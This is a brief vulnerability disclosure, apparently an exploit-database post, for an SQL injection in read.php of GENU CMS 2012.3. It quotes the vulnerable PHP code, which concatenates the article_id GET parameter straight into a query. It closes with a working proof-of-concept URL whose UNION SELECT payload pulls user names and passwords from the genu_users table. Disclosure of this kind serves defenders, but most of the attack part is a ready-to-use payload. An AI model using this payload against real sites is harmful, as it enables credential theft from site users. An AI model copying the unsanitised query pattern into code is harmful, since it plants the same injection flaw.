@@ -1,0 +1,25 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+GENU CMS SQL Injection Vulnerability
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+bug found by h0rd h0rd[at]null.net
+homepage http://h0rd.net
+download http://www.gnew.fr/pages/download.php?file=GENU-2012.3.tar.gz
+vulnerability in read.php
+vuln code:
+[...]
+include('./../includes/common.php');
+
+page_header($lang['ARTICLES_READ_TITLE']);
+
+if (isset($_GET['article_id']))
+{
+    $sql->query('SELECT ' . TABLE_ARTICLES . '.article_date, ' . TABLE_ARTICLES . '.article_subject, ' . TABLE_ARTICLES . '.article_text, ' . TABLE_USERS . '.user_id, ' . TABLE_USERS . '.user_name
+                 FROM ' . TABLE_ARTICLES . ', ' . TABLE_USERS . '
+                 WHERE ' . TABLE_ARTICLES . '.user_id = ' . TABLE_USERS . '.user_id
+                 AND ' . TABLE_ARTICLES . '.article_id = ' . $_GET['article_id']);
+    $table_articles = $sql->fetch();
+[...]
+
+PoC exploit:
+http://[host]/articles/read.php?article_id=null union select 1,concat(user_name,0x3a,0x3a,0x3a,user_password),3,4,5 from genu_users--
